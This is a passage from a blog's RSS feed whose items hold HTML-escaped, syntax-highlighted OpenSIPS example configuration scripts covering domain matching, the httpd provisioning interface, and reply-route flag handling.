&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:.*[@:]siphub.net&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;request for siphub.net received\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;request for other domain [&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;] received\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>httpd</title>
      <link>https://wdd.js.org/opensips/ch8/httpd/</link>
      <pubDate>Thu, 28 May 2020 09:59:25 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/httpd/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $Id$
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# this example shows use of opensips&amp;#39;s provisioning interface
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib64/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;httpd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;httpd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;8888)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_http.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pi_http.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pi_http&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;framework&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/src/opensips/examples/pi_framework.xml&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_xmlrpc_ng.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>flag_reply</title>
      <link>https://wdd.js.org/opensips/ch8/flag-reply/</link>
      <pubDate>Thu, 28 May 2020 09:58:33 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/flag-reply/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# simple quick-start config script
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------- global configuration parameters ------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#75715e&#34;&gt;# logging level (cmd line: -dddddddddd)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no  &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd line: -E)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;check_via&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no	&lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -v)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no           &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -r)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rev_dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no      &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -R)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5060&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use SQL database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;db_mysql.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;textops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want digest authentication
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# mysql.so must be loaded !
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;auth.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;auth_db.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- mi_fifo params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- usrloc params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use SQL database 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for persistent storage and comment the previous line
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;usrloc&amp;#34;, &amp;#34;db_mode&amp;#34;, 2)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- auth params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment if you are using auth module
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;auth_db&amp;#34;, &amp;#34;calculate_ha1&amp;#34;, yes)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you set &amp;#34;calculate_ha1&amp;#34; parameter to yes (which true in this config), 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment also the following parameter)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;auth_db&amp;#34;, &amp;#34;password_column&amp;#34;, &amp;#34;password&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;setflag(1);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;t_on_failure(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;t_on_reply(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;log(1,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;message received\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;t_relay(&amp;#34;udp&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;opensips.org:5060&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;onreply_route[1]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(isflagset(1))&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log(1, &amp;#34;onreply&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; flag set\n&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreply: flag unset\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
